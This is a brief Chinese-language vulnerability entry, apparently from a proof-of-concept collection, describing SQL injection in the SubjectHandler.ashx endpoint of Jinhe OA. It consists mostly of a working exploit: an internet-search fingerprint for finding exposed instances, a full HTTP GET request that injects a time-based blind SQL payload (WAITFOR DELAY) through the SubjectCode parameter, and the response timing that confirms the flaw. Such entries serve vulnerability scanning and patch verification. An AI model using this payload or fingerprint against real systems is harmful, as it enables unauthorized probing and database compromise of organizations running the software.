# 金和OASubjectHandler.ashx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/JHSoft.Web.CostControl/subClass/Handlers/SubjectHandler.ashx?SubjectCode=1'%20WAITFOR%20DELAY%20'0:0:5'--%20&Action=updateactive HTTP/1.1`
- **响应特征**：200 响应时间>=5s